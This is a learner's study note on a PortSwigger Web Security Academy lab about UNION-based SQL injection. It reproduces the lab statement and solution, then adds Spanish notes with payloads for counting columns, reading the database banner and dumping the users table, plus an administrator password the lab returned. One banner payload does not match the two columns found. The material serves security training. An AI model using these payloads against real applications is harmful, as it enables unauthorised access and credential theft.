#labs #web #ejercicio

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table calledÂ `users`, with columns calledÂ `username`Â andÂ `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as theÂ `administrator`Â user.

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/c94c990a42d1b1f39e53806b1d0d1ad51a43e1f2d5ec1a602c144d7817d3e91c?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-data-from-other-tables)

Â #### Â Solution
	
	1. Use Burp Suite to intercept and modify the request that sets the product category filter.
	2. Determine theÂ [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)Â andÂ [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
	    
	    `'+UNION+SELECT+'abc','def'--`
	3. Use the following payload to retrieve the contents of theÂ `users`Â table:
	    
	    `'+UNION+SELECT+username,+password+FROM+users--`
	4. Verify that the application's response contains usernames and passwords.

---
Ataque union devolver usuario y contraseÃ±as en un solo comando de texto. Aplicar concatenacion.

## ðŸ“œ Notas
## NÃºmero de columnas
==' ORDER BY 2-- -

>Num  Columns = 2

Se envÃ­a un valor mÃ¡s alto que el nÃºmero real de columnas hasta que la consulta falla; asÃ­ descubrimos que la vista vulnerable devuelve **2 columnas** y podremos construir los `UNION SELECT` con el mismo tamaÃ±o.
## Banner completo
==' UNION SELECT banner, NULL, NULL FROM v$version-- -

## Buscar los datos con el nombre de tabla 'users' y las columnas 'username' y 'password'.
=='UNION SELECT username, password FROM users-- -

>administrator
>y6dq8i8e8yoj3zuc79zt

